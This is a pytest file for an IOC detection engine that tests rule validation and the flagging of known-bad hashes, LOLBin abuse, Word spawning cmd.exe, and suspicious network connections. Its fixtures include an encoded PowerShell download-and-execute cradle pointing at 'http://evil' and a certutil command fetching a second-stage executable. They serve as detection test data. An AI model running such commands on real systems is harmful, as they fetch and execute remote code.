"""
Tests for JOCKY Stage 6 IOC Rule Engine
Covers rule loading, validation, pattern matching, parent-child detection,
hash lookup, severity tracking, and disabled rule filtering.
"""
import pytest

from analysis.ioc import IOCEngine, IOCRule, RuleValidator, RuleValidationError
from analysis.models import IOCFinding
from evidence.schema import CanonicalEvidenceItem, EvidenceType


# ============================================================================
# 1. IOC Rule Schema & Validation Tests
# ============================================================================

class TestIOCRuleValidation:
    def test_valid_rule_instantiation(self):
        rule_dict = {
            "rule_id": "TEST-01",
            "name": "Test Rule",
            "description": "Test description",
            "severity": "high",
            "enabled": True,
            "evidence_types": ["process"],
            "conditions": {"field": "name", "target": "malware.exe"},
            "explanation": "Test explanation",
        }
        rule = IOCRule.from_dict(rule_dict)
        assert rule.rule_id == "TEST-01"
        assert rule.severity == "high"
        assert rule.enabled is True

    def test_missing_required_field_raises(self):
        with pytest.raises(RuleValidationError) as exc:
            IOCRule.from_dict({"rule_id": "TEST-02", "name": "No Severity"})
        assert "severity" in str(exc.value)

    def test_invalid_severity_raises(self):
        with pytest.raises(RuleValidationError) as exc:
            IOCRule.from_dict({
                "rule_id": "TEST-03",
                "name": "Bad Sev",
                "severity": "extreme_danger",
                "evidence_types": ["process"],
                "conditions": {"x": 1},
            })
        assert "Invalid severity" in str(exc.value)

    def test_invalid_evidence_type_raises(self):
        with pytest.raises(RuleValidationError) as exc:
            IOCRule.from_dict({
                "rule_id": "TEST-04",
                "name": "Bad Type",
                "severity": "low",
                "evidence_types": ["quantum_memory"],
                "conditions": {"x": 1},
            })
        assert "Invalid evidence type" in str(exc.value)


# ============================================================================
# 2. IOC Engine Detection Tests
# ============================================================================

class TestIOCEngineDetection:
    @pytest.fixture
    def engine(self):
        return IOCEngine()

    def test_known_good_evidence_yields_no_findings(self, engine):
        clean_proc = CanonicalEvidenceItem(
            id="CLEAN-01",
            host="HOST-1",
            type=EvidenceType.PROCESS.value,
            data={
                "pid": 500,
                "ppid": 4,
                "name": "svchost.exe",
                "exe_path": "C:\\Windows\\System32\\svchost.exe",
                "cmdline": "C:\\Windows\\System32\\svchost.exe -k DcomLaunch",
            },
        )
        findings = engine.evaluate_item(clean_proc)
        assert len(findings) == 0

    def test_matching_ioc_known_hash(self, engine):
        malicious_proc = CanonicalEvidenceItem(
            id="MAL-01",
            host="HOST-1",
            type=EvidenceType.PROCESS.value,
            data={
                "pid": 666,
                "name": "payload.exe",
                "exe_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            },
        )
        findings = engine.evaluate_item(malicious_proc)
        assert len(findings) == 1
        f = findings[0]
        assert f.rule_id == "IOC-HASH-001"
        assert f.severity == "critical"
        assert "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" in f.reason

    def test_matching_ioc_lolbin_powershell_encoded(self, engine):
        encoded_proc = CanonicalEvidenceItem(
            id="LOLBIN-01",
            host="HOST-1",
            type=EvidenceType.PROCESS.value,
            data={
                "pid": 1204,
                "name": "powershell.exe",
                "cmdline": "powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAnACkA",
            },
        )
        findings = engine.evaluate_item(encoded_proc)
        assert len(findings) >= 1
        assert any(f.rule_id == "IOC-PROC-001" for f in findings)
        f = next(f for f in findings if f.rule_id == "IOC-PROC-001")
        assert f.severity == "high"
        assert "powershell" in f.reason.lower()

    def test_matching_ioc_lolbin_certutil(self, engine):
        certutil_proc = CanonicalEvidenceItem(
            id="LOLBIN-02",
            host="HOST-1",
            type=EvidenceType.PROCESS.value,
            data={
                "pid": 1337,
                "name": "certutil.exe",
                "cmdline": "certutil.exe -urlcache -split -f http://example.com/stage2.exe C:\\temp\\s.exe",
            },
        )
        findings = engine.evaluate_item(certutil_proc)
        assert any(f.rule_id == "IOC-PROC-001" for f in findings)

    def test_matching_ioc_parent_child(self, engine):
        parent_doc = CanonicalEvidenceItem(
            id="PARENT-01",
            host="HOST-1",
            type=EvidenceType.PROCESS.value,
            data={"pid": 2000, "ppid": 4, "name": "winword.exe"},
        )
        child_cmd = CanonicalEvidenceItem(
            id="CHILD-01",
            host="HOST-1",
            type=EvidenceType.PROCESS.value,
            data={"pid": 2004, "ppid": 2000, "name": "cmd.exe"},
        )
        findings = engine.evaluate_all([parent_doc, child_cmd])
        assert len(findings) >= 1
        pc_finding = next(f for f in findings if f.rule_id == "IOC-PROC-002")
        assert pc_finding.severity == "high"
        assert "winword.exe" in pc_finding.reason and "cmd.exe" in pc_finding.reason

    def test_matching_ioc_suspicious_remote_ip(self, engine):
        net_item = CanonicalEvidenceItem(
            id="NET-01",
            host="HOST-1",
            type=EvidenceType.NETWORK.value,
            data={
                "protocol": "TCP",
                "local_ip": "192.168.1.50",
                "local_port": 49152,
                "remote_ip": "10.0.0.99",
                "remote_port": 443,
            },
        )
        findings = engine.evaluate_item(net_item)
        assert len(findings) == 1
        assert findings[0].rule_id == "IOC-NET-001"
        assert findings[0].severity == "high"

    def test_disabled_rule_yields_no_finding(self, engine):
        # Disable IOC-NET-001
        for r in engine.rules:
            if r.rule_id == "IOC-NET-001":
                r.enabled = False

        net_item = CanonicalEvidenceItem(
            id="NET-02",
            host="HOST-1",
            type=EvidenceType.NETWORK.value,
            data={"remote_ip": "10.0.0.99"},
        )
        findings = engine.evaluate_item(net_item)
        assert len(findings) == 0

